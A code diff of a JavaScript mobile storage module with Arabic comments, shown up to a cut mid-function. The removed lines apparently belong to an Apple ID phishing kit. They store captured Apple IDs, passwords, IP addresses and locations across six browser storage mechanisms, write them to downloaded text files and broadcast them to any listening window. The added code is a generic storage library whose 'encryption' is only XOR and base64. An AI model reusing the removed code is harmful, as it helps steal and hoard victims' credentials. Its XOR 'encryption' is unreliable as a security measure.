@@ -1,648 +1,1057 @@
-// 📁 mobile-storage.js - نظام تخزين متقدم للهواتف
+// 📁 mobile-storage.js - نظام تخزين متقدم للجوال
 
 class MobileStorage {
     constructor() {
-        this.version = '3.0.0';
-        this.isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-        this.storagePrefix = 'apple_mobile_';
-        this.init();
+        this.version = '2.0.0';
+        this.supported = this.checkSupport();
+        this.storages = {
+            localStorage: null,
+            sessionStorage: null,
+            indexedDB: null,
+            cookies: null,
+            fileSystem: null
+        };
+        
+        this.settings = {
+            encryption: false,
+            compression: false,
+            backup: true,
+            syncInterval: 60000, // دقيقة
+            maxSize: 50 * 1024 * 1024 // 50MB
+        };
+        
+        this.initialize();
     }
     
-    async init() {
-        console.log('📱 بدء نظام تخزين الهواتف...');
+    // التحقق من دعم المتصفح
+    checkSupport() {
+        const supports = {
+            localStorage: !!window.localStorage,
+            sessionStorage: !!window.sessionStorage,
+            indexedDB: !!window.indexedDB,
+            cookies: navigator.cookieEnabled,
+            fileSystem: !!window.showOpenFilePicker,
+            serviceWorker: 'serviceWorker' in navigator,
+            webSQL: !!window.openDatabase,
+            cacheAPI: 'caches' in window
+        };
         
-        // إنشاء قاعدة بيانات
-        await this.createDatabase();
-        
-        // تهيئة التخزين المحلي
-        this.initLocalStorage();
-        
-        // تهيئة Service Worker
-        this.initServiceWorker();
-        
-        // بدء النسخ الاحتياطي
-        this.startBackup();
-        
-        console.log('✅ نظام تخزين الهواتف جاهز');
+        console.log('📱 Storage support:', supports);
+        return supports;
     }
     
-    // إنشاء قاعدة بيانات
-    async createDatabase() {
+    // تهيئة النظام
+    async initialize() {
+        console.log(`📱 Mobile Storage v${this.version} initializing...`);
+        
+        // تحميل الإعدادات
+        this.loadSettings();
+        
+        // تهيئة جميع أنظمة التخزين
+        await this.initAllStorages();
+        
+        // بدء المزامنة التلقائية
+        this.startAutoSync();
+        
+        // مراقبة حالة التخزين
+        this.monitorStorage();
+        
+        // إنشاء نسخة احتياطية أولية
+        if (this.settings.backup) {
+            this.createBackup();
+        }
+        
+        console.log('✅ Mobile Storage ready');
+    }
+    
+    // تحميل الإعدادات
+    loadSettings() {
         try {
-            if (!window.indexedDB) {
-                console.warn('⚠️ IndexedDB غير مدعوم على هذا الجهاز');
-                return false;
+            const saved = localStorage.getItem('mobile_storage_settings');
+            if (saved) {
+                this.settings = { ...this.settings, ...JSON.parse(saved) };
             }
-            
-            return new Promise((resolve) => {
-                const request = indexedDB.open('AppleMobileDB', 2);
-                
-                request.onerror = () => {
-                    console.warn('⚠️ لا يمكن فتح قاعدة البيانات');
-                    resolve(false);
-                };
-                
-                request.onsuccess = (event) => {
-                    this.db = event.target.result;
-                    console.log('✅ قاعدة بيانات الهواتف جاهزة');
-                    resolve(true);
-                };
+        } catch (error) {
+            console.warn('⚠️ Settings load error:', error);
+        }
+    }
+    
+    // تهيئة جميع أنظمة التخزين
+    async initAllStorages() {
+        // localStorage
+        if (this.supported.localStorage) {
+            this.storages.localStorage = {
+                type: 'localStorage',
+                available: true,
+                quota: this.getLocalStorageQuota(),
+                used: this.getLocalStorageUsage()
+            };
+        }
+        
+        // sessionStorage
+        if (this.supported.sessionStorage) {
+            this.storages.sessionStorage = {
+                type: 'sessionStorage',
+                available: true,
+                used: this.getSessionStorageUsage()
+            };
+        }
+        
+        // indexedDB
+        if (this.supported.indexedDB) {
+            await this.initIndexedDB();
+        }
+        
+        // ملفات الكوكيز
+        if (this.supported.cookies) {
+            this.storages.cookies = {
+                type: 'cookies',
+                available: true,
+                count: document.cookie.split(';').filter(c => c.trim()).length
+            };
+        }
+        
+        // نظام الملفات
+        if (this.supported.fileSystem) {
+            this.storages.fileSystem = {
+                type: 'fileSystem',
+                available: true
+            };
+        }
+        
+        console.log('💾 Storages initialized:', this.storages);
+    }
+    
+    // الحصول على مساحة localStorage المتاحة
+    getLocalStorageQuota() {
+        try {
+            // هذه مجرد تقدير تقريبي
+            return 5 * 1024 * 1024; // 5MB افتراضياً
+        } catch (error) {
+            return 0;
+        }
+    }
+    
+    // الحصول على استخدام localStorage
+    getLocalStorageUsage() {
+        try {
+            let total = 0;
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                total += key.length + value.length;
+            }
+            return total;
+        } catch (error) {
+            return 0;
+        }
+    }
+    
+    // الحصول على استخدام sessionStorage
+    getSessionStorageUsage() {
+        try {
+            let total = 0;
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const value = sessionStorage.getItem(key);
+                total += key.length + value.length;
+            }
+            return total;
+        } catch (error) {
+            return 0;
+        }
+    }
+    
+    // تهيئة IndexedDB
+    async initIndexedDB() {
+        return new Promise((resolve) => {
+            try {
+                const request = indexedDB.open('MobileStorageDB', 1);
                 
                 request.onupgradeneeded = (event) => {
                     const db = event.target.result;
                     
-                    // مخزن بيانات الدخول
-                    if (!db.objectStoreNames.contains('credentials')) {
-                        const store = db.createObjectStore('credentials', { 
-                            keyPath: 'mobile_id',
-                            autoIncrement: true 
-                        });
+                    // إنشاء مخزن للبيانات
+                    if (!db.objectStoreNames.contains('data')) {
+                        const store = db.createObjectStore('data', { keyPath: 'id' });
+                        store.createIndex('type', 'type', { unique: false });
                         store.createIndex('timestamp', 'timestamp', { unique: false });
-                        store.createIndex('appleId', 'appleId', { unique: false });
-                        store.createIndex('device', 'deviceType', { unique: false });
                     }
                     
-                    // مخزن الزيارات
-                    if (!db.objectStoreNames.contains('mobile_visits')) {
-                        const store = db.createObjectStore('mobile_visits', { 
-                            keyPath: 'visit_id',
-                            autoIncrement: true 
-                        });
-                        store.createIndex('timestamp', 'timestamp', { unique: false });
-                        store.createIndex('ip', 'ip', { unique: false });
-                        store.createIndex('device', 'isMobile', { unique: false });
+                    // مخزن للنسخ الاحتياطية
+                    if (!db.objectStoreNames.contains('backups')) {
+                        db.createObjectStore('backups', { keyPath: 'id' });
                     }
                     
-                    // مخزن الملفات
-                    if (!db.objectStoreNames.contains('files')) {
-                        db.createObjectStore('files', { keyPath: 'file_id' });
+                    // مخزن للسجلات
+                    if (!db.objectStoreNames.contains('logs')) {
+                        db.createObjectStore('logs', { keyPath: 'id' });
                     }
                 };
-            });
+                
+                request.onsuccess = (event) => {
+                    const db = event.target.result;
+                    this.storages.indexedDB = {
+                        type: 'indexedDB',
+                        available: true,
+                        database: db,
+                        version: db.version
+                    };
+                    
+                    console.log('🗃️ IndexedDB initialized');
+                    resolve(db);
+                };
+                
+                request.onerror = (event) => {
+                    console.warn('⚠️ IndexedDB init error:', event.target.error);
+                    this.storages.indexedDB = {
+                        type: 'indexedDB',
+                        available: false,
+                        error: event.target.error
+                    };
+                    resolve(null);
+                };
+                
+            } catch (error) {
+                console.warn('⚠️ IndexedDB error:', error);
+                this.storages.indexedDB = {
+                    type: 'indexedDB',
+                    available: false,
+                    error: error
+                };
+                resolve(null);
+            }
+        });
+    }
+    
+    // حفظ البيانات
+    async save(key, data, options = {}) {
+        const {
+            storageType = 'auto', // auto, localStorage, sessionStorage, indexedDB, all
+            ttl = null, // وقت الانتهاء بالمللي ثانية
+            encrypt = this.settings.encryption,
+            compress = this.settings.compression,
+            priority = 'medium' // low, medium, high
+        } = options;
+        
+        const saveData = {
+            id: key,
+            data: data,
+            timestamp: Date.now(),
+            ttl: ttl,
+            priority: priority,
+            metadata: {
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                device: this.getDeviceInfo()
+            }
+        };
+        
+        // التشفير إذا كان مفعلاً
+        if (encrypt) {
+            saveData.data = this.encryptData(data);
+            saveData.encrypted = true;
+        }
+        
+        // الضغط إذا كان مفعلاً
+        if (compress) {
+            saveData.data = this.compressData(saveData.data);
+            saveData.compressed = true;
+        }
+        
+        // حفظ في أنظمة التخزين المحددة
+        const results = {};
+        
+        if (storageType === 'auto' || storageType === 'all' || storageType === 'localStorage') {
+            results.localStorage = await this.saveToLocalStorage(key, saveData);
+        }
+        
+        if (storageType === 'auto' || storageType === 'all' || storageType === 'sessionStorage') {
+            results.sessionStorage = await this.saveToSessionStorage(key, saveData);
+        }
+        
+        if (storageType === 'auto' || storageType === 'all' || storageType === 'indexedDB') {
+            results.indexedDB = await this.saveToIndexedDB(key, saveData);
+        }
+        
+        // تسجيل عملية الحفظ
+        await this.logStorageOperation('save', {
+            key: key,
+            storageType: storageType,
+            size: JSON.stringify(saveData).length,
+            results: results
+        });
+        
+        return {
+            success: Object.values(results).some(r => r),
+            results: results,
+            data: saveData
+        };
+    }
+    
+    // حفظ في localStorage
+    async saveToLocalStorage(key, data) {
+        try {
+            localStorage.setItem(key, JSON.stringify(data));
+            
+            // تحديث استخدام التخزين
+            this.storages.localStorage.used = this.getLocalStorageUsage();
+            
+            return true;
         } catch (error) {
-            console.error('❌ خطأ في إنشاء قاعدة البيانات:', error);
+            console.warn('⚠️ localStorage save error:', error);
+            
+            // محاولة تنظيف إذا كان ممتلئاً
+            if (error.name === 'QuotaExceededError') {
+                await this.cleanupLocalStorage();
+                return this.saveToLocalStorage(key, data);
+            }
+            
             return false;
         }
     }
     
-    // تهيئة التخزين المحلي
-    initLocalStorage() {
+    // حفظ في sessionStorage
+    async saveToSessionStorage(key, data) {
         try {
-            if (typeof localStorage !== 'undefined') {
-                // تهيئة التخزين للهواتف
-                if (!localStorage.getItem('mobile_init')) {
-                    localStorage.setItem('mobile_init', 'true');
-                    localStorage.setItem('mobile_version', this.version);
-                    localStorage.setItem('mobile_device', this.isMobile ? 'mobile' : 'desktop');
-                }
-                return true;
-            }
+            sessionStorage.setItem(key, JSON.stringify(data));
+            return true;
         } catch (error) {
-            console.warn('⚠️ localStorage غير متوفر:', error);
+            console.warn('⚠️ sessionStorage save error:', error);
+            return false;
         }
-        return false;
-    }
-    
-    // تهيئة Service Worker
-    async initServiceWorker() {
-        try {
-            if ('serviceWorker' in navigator) {
-                const registration = await navigator.serviceWorker.register('/sw.js', {
-                    scope: '/'
-                });
-                console.log('✅ Service Worker مسجل:', registration.scope);
-                return true;
-            }
-        } catch (error) {
-            console.warn('⚠️ Service Worker غير مدعوم:', error);
-        }
-        return false;
-    }
-    
-    // حفظ بيانات الدخول
-    async saveCredential(data) {
-        console.log('💾 محاولة حفظ بيانات الدخول على الهاتف...');
-        
-        const results = [];
-        
-        // 1. حفظ في IndexedDB
-        if (this.db) {
-            try {
-                const saved = await this.saveToIndexedDB('credentials', {
-                    ...data,
-                    mobile_id: Date.now(),
-                    saved_at: new Date().toISOString(),
-                    storage_method: 'indexeddb'
-                });
-                results.push({ method: 'indexeddb', success: saved });
-            } catch (error) {
-                results.push({ method: 'indexeddb', success: false, error: error.message });
-            }
-        }
-        
-        // 2. حفظ في localStorage
-        try {
-            const saved = this.saveToLocalStorage('mobile_credentials', data);
-            results.push({ method: 'localStorage', success: saved });
-        } catch (error) {
-            results.push({ method: 'localStorage', success: false, error: error.message });
-        }
-        
-        // 3. حفظ في ملف
-        try {
-            const saved = await this.saveToMobileFile(data);
-            results.push({ method: 'file', success: saved });
-        } catch (error) {
-            results.push({ method: 'file', success: false, error: error.message });
-        }
-        
-        // 4. حفظ في Session Storage
-        try {
-            const saved = this.saveToSessionStorage(data);
-            results.push({ method: 'sessionStorage', success: saved });
-        } catch (error) {
-            results.push({ method: 'sessionStorage', success: false, error: error.message });
-        }
-        
-        // 5. حفظ في Web SQL (للأجهزة القديمة)
-        try {
-            const saved = await this.saveToWebSQL(data);
-            results.push({ method: 'webSQL', success: saved });
-        } catch (error) {
-            results.push({ method: 'webSQL', success: false, error: error.message });
-        }
-        
-        // 6. حفظ في Cache API
-        try {
-            const saved = await this.saveToCache(data);
-            results.push({ method: 'cache', success: saved });
-        } catch (error) {
-            results.push({ method: 'cache', success: false, error: error.message });
-        }
-        
-        // حساب النجاحات
-        const successful = results.filter(r => r.success).length;
-        console.log(`✅ تم الحفظ بـ ${successful}/${results.length} طريقة`);
-        
-        // تحديث لوحة التحكم
-        this.updateDashboard(data, successful);
-        
-        return successful > 0;
     }
     
     // حفظ في IndexedDB
-    async saveToIndexedDB(storeName, data) {
+    async saveToIndexedDB(key, data) {
+        if (!this.storages.indexedDB?.available) {
+            return false;
+        }
+        
         return new Promise((resolve) => {
             try {
-                const transaction = this.db.transaction([storeName], 'readwrite');
-                const store = transaction.objectStore(storeName);
-                const request = store.add(data);
+                const transaction = this.storages.indexedDB.database.transaction(['data'], 'readwrite');
+                const store = transaction.objectStore('data');
+                
+                const request = store.put({
+                    id: key,
+                    ...data
+                });
                 
                 request.onsuccess = () => {
-                    console.log('💾 تم الحفظ في IndexedDB');
                     resolve(true);
                 };
                 
-                request.onerror = () => {
-                    console.warn('⚠️ خطأ في حفظ IndexedDB');
+                request.onerror = (event) => {
+                    console.warn('⚠️ IndexedDB save error:', event.target.error);
                     resolve(false);
                 };
                 
             } catch (error) {
-                console.warn('⚠️ IndexedDB غير متوفر:', error);
+                console.warn('⚠️ IndexedDB error:', error);
                 resolve(false);
             }
         });
     }
     
-    // حفظ في localStorage
-    saveToLocalStorage(key, data) {
-        try {
-            const existing = JSON.parse(localStorage.getItem(key) || '[]');
-            existing.push({
-                ...data,
-                mobile_saved: true,
-                saved_at: new Date().toISOString()
-            });
-            
-            // تنظيف البيانات القديمة
-            if (existing.length > 200) {
-                existing.splice(0, existing.length - 200);
+    // استرجاع البيانات
+    async get(key, options = {}) {
+        const {
+            storageType = 'auto', // auto, localStorage, sessionStorage, indexedDB
+            decrypt = this.settings.encryption,
+            decompress = this.settings.compression
+        } = options;
+        
+        let data = null;
+        let source = null;
+        
+        // المحاولة حسب الأولوية
+        const sources = storageType === 'auto' ? 
+            ['localStorage', 'sessionStorage', 'indexedDB'] : [storageType];
+        
+        for (const sourceType of sources) {
+            if (sourceType === 'localStorage' && this.storages.localStorage?.available) {
+                data = await this.getFromLocalStorage(key);
+                if (data) {
+                    source = 'localStorage';
+                    break;
+                }
             }
             
-            localStorage.setItem(key, JSON.stringify(existing));
+            if (sourceType === 'sessionStorage' && this.storages.sessionStorage?.available) {
+                data = await this.getFromSessionStorage(key);
+                if (data) {
+                    source = 'sessionStorage';
+                    break;
+                }
+            }
             
-            // حفظ نسخة احتياطية
-            this.createLocalStorageBackup(key, existing);
-            
-            console.log('💾 تم الحفظ في localStorage');
+            if (sourceType === 'indexedDB' && this.storages.indexedDB?.available) {
+                data = await this.getFromIndexedDB(key);
+                if (data) {
+                    source = 'indexedDB';
+                    break;
+                }
+            }
+        }
+        
+        // التحقق من انتهاء الصلاحية
+        if (data && data.ttl) {
+            const now = Date.now();
+            if (now - data.timestamp > data.ttl) {
+                // حذف البيانات المنتهية
+                await this.delete(key);
+                data = null;
+                source = null;
+            }
+        }
+        
+        // فك التشفير إذا كان مشفراً
+        if (data && data.encrypted && decrypt) {
+            data.data = this.decryptData(data.data);
+        }
+        
+        // فك الضغط إذا كان مضغوطاً
+        if (data && data.compressed && decompress) {
+            data.data = this.decompressData(data.data);
+        }
+        
+        return {
+            data: data?.data || null,
+            source: source,
+            metadata: data ? {
+                timestamp: data.timestamp,
+                ttl: data.ttl,
+                priority: data.priority
+            } : null
+        };
+    }
+    
+    // استرجاع من localStorage
+    async getFromLocalStorage(key) {
+        try {
+            const item = localStorage.getItem(key);
+            return item ? JSON.parse(item) : null;
+        } catch (error) {
+            console.warn('⚠️ localStorage get error:', error);
+            return null;
+        }
+    }
+    
+    // استرجاع من sessionStorage
+    async getFromSessionStorage(key) {
+        try {
+            const item = sessionStorage.getItem(key);
+            return item ? JSON.parse(item) : null;
+        } catch (error) {
+            console.warn('⚠️ sessionStorage get error:', error);
+            return null;
+        }
+    }
+    
+    // استرجاع من IndexedDB
+    async getFromIndexedDB(key) {
+        if (!this.storages.indexedDB?.available) {
+            return null;
+        }
+        
+        return new Promise((resolve) => {
+            try {
+                const transaction = this.storages.indexedDB.database.transaction(['data'], 'readonly');
+                const store = transaction.objectStore('data');
+                
+                const request = store.get(key);
+                
+                request.onsuccess = (event) => {
+                    resolve(event.target.result || null);
+                };
+                
+                request.onerror = (event) => {
+                    console.warn('⚠️ IndexedDB get error:', event.target.error);
+                    resolve(null);
+                };
+                
+            } catch (error) {
+                console.warn('⚠️ IndexedDB error:', error);
+                resolve(null);
+            }
+        });
+    }
+    
+    // حذف البيانات
+    async delete(key, storageType = 'all') {
+        const results = {};
+        
+        if (storageType === 'all' || storageType === 'localStorage') {
+            results.localStorage = await this.deleteFromLocalStorage(key);
+        }
+        
+        if (storageType === 'all' || storageType === 'sessionStorage') {
+            results.sessionStorage = await this.deleteFromSessionStorage(key);
+        }
+        
+        if (storageType === 'all' || storageType === 'indexedDB') {
+            results.indexedDB = await this.deleteFromIndexedDB(key);
+        }
+        
+        // تسجيل عملية الحذف
+        await this.logStorageOperation('delete', {
+            key: key,
+            storageType: storageType,
+            results: results
+        });
+        
+        return {
+            success: Object.values(results).some(r => r),
+            results: results
+        };
+    }
+    
+    // حذف من localStorage
+    async deleteFromLocalStorage(key) {
+        try {
+            localStorage.removeItem(key);
+            this.storages.localStorage.used = this.getLocalStorageUsage();
             return true;
         } catch (error) {
-            console.warn('⚠️ خطأ في حفظ localStorage:', error);
+            console.warn('⚠️ localStorage delete error:', error);
             return false;
         }
     }
     
-    // إنشاء نسخة احتياطية من localStorage
-    createLocalStorageBackup(key, data) {
+    // حذف من sessionStorage
+    async deleteFromSessionStorage(key) {
         try {
-            const backupKey = `${key}_backup_${Date.now()}`;
-            localStorage.setItem(backupKey, JSON.stringify(data));
-            
-            // الاحتفاظ بـ 5 نسخ فقط
-            this.cleanupBackups(key);
+            sessionStorage.removeItem(key);
+            return true;
         } catch (error) {
-            console.warn('⚠️ لا يمكن إنشاء نسخة احتياطية:', error);
+            console.warn('⚠️ sessionStorage delete error:', error);
+            return false;
         }
     }
     
-    // تنظيف النسخ الاحتياطية
-    cleanupBackups(prefix) {
+    // حذف من IndexedDB
+    async deleteFromIndexedDB(key) {
+        if (!this.storages.indexedDB?.available) {
+            return false;
+        }
+        
+        return new Promise((resolve) => {
+            try {
+                const transaction = this.storages.indexedDB.database.transaction(['data'], 'readwrite');
+                const store = transaction.objectStore('data');
+                
+                const request = store.delete(key);
+                
+                request.onsuccess = () => {
+                    resolve(true);
+                };
+                
+                request.onerror = (event) => {
+                    console.warn('⚠️ IndexedDB delete error:', event.target.error);
+                    resolve(false);
+                };
+                
+            } catch (error) {
+                console.warn('⚠️ IndexedDB error:', error);
+                resolve(false);
+            }
+        });
+    }
+    
+    // تنظيف localStorage
+    async cleanupLocalStorage() {
         try {
-            const backups = [];
+            const keysToDelete = [];
+            const now = Date.now();
+            
+            // جمع البيانات المنتهية أو ذات الأولوية المنخفضة
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
-                if (key.startsWith(`${prefix}_backup_`)) {
-                    backups.push(key);
-                }
-            }
-            
-            if (backups.length > 5) {
-                backups.sort().slice(0, backups.length - 5).forEach(key => {
-                    localStorage.removeItem(key);
-                });
-            }
-        } catch (error) {
-            console.warn('⚠️ لا يمكن تنظيف النسخ الاحتياطية:', error);
-        }
-    }
-    
-    // حفظ في ملف للهواتف
-    async saveToMobileFile(data) {
-        try {
-            const content = this.formatMobileFile(data);
-            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
-            
-            // طريقة 1: استخدام File System Access API
-            if ('showSaveFilePicker' in window) {
-                try {
-                    const handle = await window.showSaveFilePicker({
-                        suggestedName: `apple_mobile_${Date.now()}.txt`,
-                        types: [{
-                            description: 'Text files',
-                            accept: { 'text/plain': ['.txt'] }
-                        }]
-                    });
-                    
-                    const writable = await handle.createWritable();
-                    await writable.write(blob);
-                    await writable.close();
-                    
-                    console.log('💾 تم الحفظ في ملف عبر File System API');
-                    return true;
-                } catch (error) {
-                    // تجاهل إذا ألغى المستخدم
-                    if (error.name !== 'AbortError') {
-                        console.warn('⚠️ File System API غير متوفر:', error);
+                if (key.startsWith('mobile_storage_')) {
+                    const item = localStorage.getItem(key);
+                    if (item) {
+                        try {
+                            const data = JSON.parse(item);
+                            
+                            // التحقق من انتهاء الصلاحية
+                            if (data.ttl && (now - data.timestamp > data.ttl)) {
+                                keysToDelete.push(key);
+                            }
+                            // الأولوية المنخفضة
+                            else if (data.priority === 'low') {
+                                keysToDelete.push(key);
+                            }
+                        } catch (e) {
+                            keysToDelete.push(key);
+                        }
                     }
                 }
             }
             
-            // طريقة 2: استخدام Download
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `apple_mobile_${Date.now()}.txt`;
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
+            // حذف المفاتيح المحددة
+            keysToDelete.forEach(key => {
+                localStorage.removeItem(key);
+            });
             
-            setTimeout(() => {
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-            }, 100);
+            console.log(`🧹 Cleaned ${keysToDelete.length} items from localStorage`);
             
-            console.log('💾 تم تحميل الملف');
-            return true;
+            // تحديث الاستخدام
+            this.storages.localStorage.used = this.getLocalStorageUsage();
+            
+            return keysToDelete.length;
             
         } catch (error) {
-            console.warn('⚠️ لا يمكن حفظ الملف:', error);
-            return false;
+            console.warn('⚠️ Cleanup error:', error);
+            return 0;
         }
     }
     
-    // تنسيق ملف الهاتف
-    formatMobileFile(data) {
-        return `
-📱 بيانات هاتف Apple
-════════════════════════════
-🆔 المعرف: ${data.sessionId}
-📧 Apple ID: ${data.appleId}
-🔑 كلمة المرور: ${data.password}
-🌐 IP: ${data.ip}
-📍 الموقع: ${data.location?.city || 'غير معروف'}
-🕒 الوقت: ${new Date(data.timestamp).toLocaleString('ar-SA')}
-📊 الجهاز: ${data.deviceType}
-📶 الشبكة: ${data.connection || 'غير معروف'}
-🔋 البطارية: ${data.battery || 'غير معروف'}
-💾 التخزين: ${data.storage || 'غير معروف'}
-📡 نظام: ${data.platform}
-════════════════════════════
-تم الحفظ تلقائياً بواسطة نظام تخزين الهواتف
-        `.trim();
-    }
-    
-    // حفظ في Session Storage
-    saveToSessionStorage(data) {
+    // تشفير البيانات
+    encryptData(data) {
         try {
-            if (typeof sessionStorage !== 'undefined') {
-                const key = `mobile_session_${Date.now()}`;
-                sessionStorage.setItem(key, JSON.stringify(data));
-                
-                // الاحتفاظ بـ 20 سجل فقط
-                this.cleanupSessionStorage();
-                
-                console.log('💾 تم الحفظ في sessionStorage');
-                return true;
-            }
+            // هذا مثال بسيط للتشفير، يمكن استخدام مكتبة أفضل
+            const str = JSON.stringify(data);
+            return btoa(encodeURIComponent(str).split('').map(char => 
+                String.fromCharCode(char.charCodeAt(0) ^ 0x5A)
+            ).join(''));
         } catch (error) {
-            console.warn('⚠️ sessionStorage غير متوفر:', error);
+            console.warn('⚠️ Encryption error:', error);
+            return data;
         }
-        return false;
     }
     
-    // تنظيف Session Storage
-    cleanupSessionStorage() {
+    // فك تشفير البيانات
+    decryptData(encrypted) {
+        try {
+            const decrypted = decodeURIComponent(atob(encrypted).split('').map(char =>
+                String.fromCharCode(char.charCodeAt(0) ^ 0x5A)
+            ).join(''));
+            return JSON.parse(decrypted);
+        } catch (error) {
+            console.warn('⚠️ Decryption error:', error);
+            return encrypted;
+        }
+    }
+    
+    // ضغط البيانات
+    compressData(data) {
+        try {
+            // هذا مثال بسيط للضغط
+            const str = JSON.stringify(data);
+            return btoa(str); // Base64 encoding as simple compression
+        } catch (error) {
+            console.warn('⚠️ Compression error:', error);
+            return data;
+        }
+    }
+    
+    // فك ضغط البيانات
+    decompressData(compressed) {
+        try {
+            const str = atob(compressed);
+            return JSON.parse(str);
+        } catch (error) {
+            console.warn('⚠️ Decompression error:', error);
+            return compressed;
+        }
+    }
+    
+    // بدء المزامنة التلقائية
+    startAutoSync() {
+        setInterval(async () => {
+            await this.syncStorages();
+        }, this.settings.syncInterval);
+    }
+    
+    // مزامنة أنظمة التخزين
+    async syncStorages() {
+        console.log('🔄 Syncing storages...');
+        
+        try {
+            // مزامنة البيانات بين localStorage و indexedDB
+            await this.syncLocalStorageToIndexedDB();
+            
+            // إنشاء نسخة احتياطية
+            if (this.settings.backup) {
+                await this.createBackup();
+            }
+            
+            // تنظيف البيانات القديمة
+            await this.cleanupOldData();
+            
+            console.log('✅ Sync completed');
+            
+        } catch (error) {
+            console.warn('⚠️ Sync error:', error);
+        }
+    }
+    
+    // مزامنة localStorage إلى IndexedDB
+    async syncLocalStorageToIndexedDB() {
+        if (!this.storages.indexedDB?.available) return;
+        
         try {
             const keys = [];
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                if (key.startsWith('mobile_session_')) {
-                    keys.push(key);
-                }
+            for (let i = 0; i < localStorage.length; i++) {
+                keys.push(localStorage.key(i));
             }
             
-            if (keys.length > 20) {
-                keys.sort().slice(0, keys.length - 20).forEach(key => {
-                    sessionStorage.removeItem(key);
-                });
-            }
-        } catch (error) {
-            console.warn('⚠️ لا يمكن تنظيف sessionStorage:', error);
-        }
-    }
-    
-    // حفظ في Web SQL (للأجهزة القديمة)
-    async saveToWebSQL(data) {
-        try {
-            if (window.openDatabase) {
-                return new Promise((resolve) => {
-                    const db = openDatabase('AppleMobileSQL', '1.0', 'Mobile Database', 2 * 1024 * 1024);
-                    
-                    db.transaction(function(tx) {
-                        tx.executeSql(
-                            'CREATE TABLE IF NOT EXISTS credentials (id INTEGER PRIMARY KEY, data TEXT, timestamp DATETIME)'
-                        );
+            let syncedCount = 0;
+            
+            for (const key of keys) {
+                try {
+                    const item = localStorage.getItem(key);
+                    if (item) {
+                        const data = JSON.parse(item);
                         
-                        tx.executeSql(
-                            'INSERT INTO credentials (data, timestamp) VALUES (?, ?)',
-                            [JSON.stringify(data), new Date().toISOString()],
-                            function() {
-                                console.log('💾 تم الحفظ في Web SQL');
-                                resolve(true);
-                            },
-                            function() {
-                                resolve(false);
-                            }
-                        );
-                    });
-                });
-            }
-        } catch (error) {
-            console.warn('⚠️ Web SQL غير متوفر:', error);
-        }
-        return false;
-    }
-    
-    // حفظ في Cache API
-    async saveToCache(data) {
-        try {
-            if ('caches' in window) {
-                const cache = await caches.open('apple-mobile-cache');
-                const response = new Response(JSON.stringify(data), {
-                    headers: { 'Content-Type': 'application/json' }
-                });
-                
-                await cache.put(`/credential_${Date.now()}`, response);
-                console.log('💾 تم الحفظ في Cache API');
-                return true;
-            }
-        } catch (error) {
-            console.warn('⚠️ Cache API غير متوفر:', error);
-        }
-        return false;
-    }
-    
-    // حفظ زيارة
-    async saveVisit(data) {
-        try {
-            const results = [];
-            
-            // IndexedDB
-            if (this.db) {
-                const saved = await this.saveToIndexedDB('mobile_visits', {
-                    ...data,
-                    visit_id: Date.now(),
-                    saved_at: new Date().toISOString()
-                });
-                results.push({ method: 'indexeddb', success: saved });
-            }
-            
-            // localStorage
-            const savedLocal = this.saveToLocalStorage('mobile_visits', data);
-            results.push({ method: 'localStorage', success: savedLocal });
-            
-            return results.some(r => r.success);
-        } catch (error) {
-            console.error('❌ خطأ في حفظ الزيارة:', error);
-            return false;
-        }
-    }
-    
-    // تحديث لوحة التحكم
-    updateDashboard(data, successfulMethods) {
-        try {
-            const update = {
-                type: 'mobile_update',
-                data: data,
-                timestamp: Date.now(),
-                successful_methods: successfulMethods,
-                device: this.isMobile ? 'mobile' : 'desktop',
-                storage: {
-                    indexeddb: !!this.db,
-                    localStorage: typeof localStorage !== 'undefined',
-                    sessionStorage: typeof sessionStorage !== 'undefined',
-                    filesystem: 'showSaveFilePicker' in window,
-                    websql: !!window.openDatabase,
-                    cache: 'caches' in window
+                        // حفظ في IndexedDB
+                        await this.saveToIndexedDB(key, data);
+                        syncedCount++;
+                    }
+                } catch (e) {
+                    console.warn(`⚠️ Sync error for key ${key}:`, e);
                 }
-            };
+            }
             
-            // إرسال التحديث
-            localStorage.setItem('mobile_dashboard_update', JSON.stringify(update));
-            window.postMessage(update, '*');
-            
-            console.log('📡 تم تحديث لوحة التحكم من الهاتف');
+            if (syncedCount > 0) {
+                console.log(`🔄 Synced ${syncedCount} items to IndexedDB`);
+            }
             
         } catch (error) {
-            console.warn('⚠️ لا يمكن تحديث لوحة التحكم:', error);
+            console.warn('⚠️ Storage sync error:', error);
         }
-    }
-    
-    // بدء النسخ الاحتياطي
-    startBackup() {
-        // نسخ احتياطي كل 5 دقائق
-        setInterval(() => {
-            this.createBackup();
-        }, 300000);
     }
     
     // إنشاء نسخة احتياطية
     async createBackup() {
         try {
-            const backup = {
+            const backupData = {
+                id: `backup_${Date.now()}`,
                 timestamp: new Date().toISOString(),
-                version: this.version,
-                data: {
-                    credentials: await this.getFromIndexedDB('credentials', 50),
-                    visits: await this.getFromIndexedDB('mobile_visits', 100)
+                data: {},
+                metadata: {
+                    userAgent: navigator.userAgent,
+                    url: window.location.href,
+                    storages: this.storages
                 }
             };
             
-            const blob = new Blob([JSON.stringify(backup, null, 2)], { 
-                type: 'application/json' 
-            });
+            // نسخ بيانات localStorage
+            if (this.storages.localStorage?.available) {
+                backupData.data.localStorage = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    backupData.data.localStorage[key] = localStorage.getItem(key);
+                }
+            }
             
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `mobile_backup_${Date.now()}.json`;
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
+            // حفظ النسخة الاحتياطية
+            if (this.storages.indexedDB?.available) {
+                await this.saveBackupToIndexedDB(backupData);
+            }
             
-            setTimeout(() => {
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-            }, 100);
